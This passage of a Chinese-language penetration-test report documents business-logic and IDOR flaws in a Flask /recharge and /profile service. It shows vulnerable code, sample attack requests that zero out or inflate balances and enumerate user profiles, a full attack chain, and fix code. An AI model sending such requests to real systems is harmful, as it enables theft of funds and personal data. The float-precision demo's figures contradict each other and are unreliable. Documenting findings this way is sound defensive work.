## 3. 业务逻辑漏洞测试

### BL-001：负值充值漏洞

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | BL-001 |
| **漏洞名称** | 负值充值（余额随意篡改） |
| **漏洞类型** | 业务逻辑漏洞 — 参数未校验 |
| **CWE 编号** | CWE-841：Improper Enforcement of Behavioral Workflow |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 481 行 `amount = float(amount)`，第 485 行 `balance = balance + amount` |

#### 漏洞代码

```python
# app.py 第 471-501 行
@app.route("/recharge", methods=["POST"])
def recharge():
    user_id = request.form.get("user_id")
    amount = request.form.get("amount")

    ...

    user_id = int(user_id)
    amount = float(amount)        # ← 未校验正负

    # 直接修改余额：balance = balance + amount（不做正负校验）
    ...
    user_data["balance"] = user_data.get("balance", 0) + amount   # ← 负数也累加
```

#### 漏洞详情

`/recharge` 路由直接使用 `balance = balance + amount` 更新余额，但 **未检查 `amount` 是否为正数**。攻击者可以提交负值金额，实现"扣款"操作，随意减少任意用户的余额。

#### 攻击演示

| 操作 | 请求 | 余额变化 |
|:-----|:-----|:---------|
| 初始状态 | - | admin 余额 = 99999 |
| 充值 -98999 | `POST /recharge` user_id=1, amount=-98999 | 99999 + (-98999) = **0** |
| 充值 -1000 | `POST /recharge` user_id=1, amount=-1000 | 0 + (-1000) = **-1000** |

**攻击请求**：
```
POST /recharge HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=1&amount=-98999
```

**效果**：管理员余额从 99999 变为 -1000（**负余额**）

### BL-002：浮点数精度漏洞

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | BL-002 |
| **漏洞名称** | 浮点数精度导致余额计算误差 |
| **漏洞类型** | 业务逻辑漏洞 — 数据类型缺陷 |
| **CWE 编号** | CWE-682：Incorrect Calculation |
| **风险等级** | 🟡 **中危** |
| **漏洞位置** | `app.py` 第 481 行 `amount = float(amount)` |

#### 漏洞代码

```python
amount = float(amount)        # ← 使用浮点数存储金额
...
user_data["balance"] = user_data.get("balance", 0) + amount
```

#### 漏洞详情

金额使用 `float` 类型存储和计算。浮点数在二进制中无法精确表示某些十进制小数（如 `0.01`），多次累加后会产生精度误差，导致账目不平。

#### 攻击演示

| 操作 | 请求 | 余额 |
|:-----|:-----|:-----|
| 初始 | - | 0 |
| 充值 0.01 | 第 1 次 | 0.01 |
| 充值 0.01 | 第 2 次 | 0.02 |
| 充值 0.01 | 第 3 次 | 0.03 |
| ... | 重复 9999 次 | **9.99999999999998**（应精确为 100.00） |

**控制台输出**：
```
99999.02999999998   ← 预期应为 99999.03
```

**影响**：
- 金融账目计算出现微小误差
- 高频小额交易后误差累积放大
- 无法通过账目审计

### BL-003：无频率限制导致资源耗尽

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | BL-003 |
| **漏洞名称** | 充值接口无频率限制 |
| **漏洞类型** | 业务逻辑漏洞 — 资源耗尽 |
| **CWE 编号** | CWE-799：Improper Control of Interaction Frequency |
| **风险等级** | 🟡 **中危** |
| **漏洞位置** | `app.py` 第 471-501 行 `/recharge` 路由 |

#### 漏洞代码

```python
@app.route("/recharge", methods=["POST"])
def recharge():        # ← 无速率限制、无频率检查、无数量限制
```

#### 漏洞详情

`/recharge` 接口无任何频率限制、无每分钟请求上限、无每日总额度限制。攻击者可在 **0.11 秒内提交 10 次充值请求**。

#### 攻击演示

```
10 次请求耗时: 0.11 秒
平均每次: 0.011 秒
1 分钟可发起: ~5454 次充值请求
```

**影响**：
- 可快速刷余额（正数）
- 可快速清空他人余额（负数）
- 短时间内消耗大量服务器资源
- 日志被无效请求淹没

## 4. 越权访问漏洞测试

### IDOR-001：水平越权 — 任意用户资料查看

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | IDOR-001 |
| **漏洞名称** | 水平越权 — 可查看任意用户个人中心 |
| **漏洞类型** | IDOR（Insecure Direct Object Reference） |
| **CWE 编号** | CWE-639：Authorization Bypass Through User-Controlled Key |
| **OWASP 分类** | A01:2021 – Broken Access Control |
| **风险等级** | 🟠 **高危** |
| **漏洞位置** | `app.py` 第 448-468 行 `/profile` 路由 |

#### 漏洞代码

```python
@app.route("/profile")
def profile():                     # ← 无 @login_required
    user_id = request.args.get("user_id")   # ← user_id 直接来自 URL 参数
    ...
    user = get_user_by_id(user_id)          # ← 无任何权限验证
    return render_template("profile.html", user=user, ...)
```

#### 漏洞详情

| 问题 | 说明 |
|:-----|:------|
| 无认证 | `@login_required` 未启用，未登录可访问 |
| 无授权 | `user_id` 直接从 URL 参数获取，不对比 session 中的用户 |
| 可遍历 | `user_id` 是自增整数，可枚举所有用户 |

#### 攻击演示

**场景：userA 查看 admin 和其他用户的资料**

```
# userA 登录后：
GET /profile?user_id=1   → ✅ 查看 admin 资料（邮箱、电话、余额）
GET /profile?user_id=2   → ✅ 查看 alice 资料
GET /profile?user_id=4   → ✅ 查看 userB 资料
```

**场景：未登录遍历所有用户**：

```
GET /profile?user_id=1   → ✅ admin
GET /profile?user_id=2   → ✅ alice
GET /profile?user_id=3   → ✅ userA
GET /profile?user_id=4   → ✅ userB
```

**攻击请求**：
```
GET /profile?user_id=1 HTTP/1.1
```

返回 admin 的邮箱（admin@example.com）、手机（13800138000）、余额（99999）。

### IDOR-002：水平越权 — 给任意用户充值

| 属性 | 内容 |
|:-----|:------|
| **漏洞编号** | IDOR-002 |
| **漏洞名称** | 水平越权 — 可给任意用户充值/扣款 |
| **漏洞类型** | IDOR + 功能级越权 |
| **CWE 编号** | CWE-639 + CWE-862：Missing Authorization |
| **风险等级** | 🔴 **严重** |
| **漏洞位置** | `app.py` 第 471-501 行 `/recharge` 路由 |

#### 漏洞代码

```python
@app.route("/recharge", methods=["POST"])
def recharge():
    user_id = request.form.get("user_id")  # ← user_id 来自表单（用户可控）
    amount = request.form.get("amount")    # ← amount 也来自表单
    ...
    # ← 没有任何"当前用户是否能操作此 user_id"的检查
    user = get_user_by_id(user_id)
    ...
    user_data["balance"] = user_data.get("balance", 0) + amount
```

#### 漏洞详情

`/recharge` 的 `user_id` 直接来自表单提交的隐藏字段。攻击者可以：

1. **修改隐藏字段**：用 Burp Suite 修改 HTML 中的 `<input type="hidden" name="user_id" value="3">` 为其他值
2. **直接 POST**：跳过前端表单，直接发送任意 `user_id`
3. **操作非本人账户**：给他人充值或扣款

#### 攻击演示

**场景：userA 给 admin 充值（正数献殷勤）**

```
POST /recharge
user_id=1&amount=1000

→ admin 账户多了 1000
```

**场景：userA 给 userB 扣款（恶意破坏）**

```
POST /recharge
user_id=4&amount=-5000

→ userB 余额减少 5000
```

**场景：userA 清空 admin 余额**

```
POST /recharge
user_id=1&amount=-99999

→ admin 余额归零
```

**攻击链（完整利用）**：

| 步骤 | 操作 | 请求 | 效果 |
|:----:|:-----|:-----|:------|
| 1 | 注册普通账号 | 注册 userA | 获得合法账号 |
| 2 | 查看管理员余额 | `GET /profile?user_id=1` | 发现 admin 余额 99999 |
| 3 | 窃取管理员余额 | `POST /recharge` user_id=1, amount=-99999 | admin 余额归零 |
| 4 | 给自己充值 | `POST /recharge` user_id=3, amount=99999 | userA 余额 +99999 |

全部 4 步**无需登录**即可完成。

### 修复代码示例（仅供参考）

```python
@app.route("/profile")
@login_required                                    # ✅ 添加认证
def profile():
    user_id = request.args.get("user_id")
    # ✅ 校验：只能查看自己的资料
    current_user = get_current_user()              # 从 session 获取
    if str(user_id) != str(current_user["id"]):
        return render_template("profile.html", error="无权查看其他用户资料")


@app.route("/recharge", methods=["POST"])
@login_required                                    # ✅ 添加认证
def recharge():
    current_user = get_current_user()
    user_id = int(request.form.get("user_id"))
    amount = float(request.form.get("amount"))
    
    # ✅ 校验：只能给自己充值
    if user_id != current_user["id"]:
        return redirect("/profile?error=无权操作")
    
    # ✅ 校验：金额必须为正数
    if amount <= 0:
        return redirect("/profile?error=金额必须大于0")
    
    # ✅ 使用 Decimal 避免精度问题
    from decimal import Decimal
    amount = Decimal(str(amount))
```
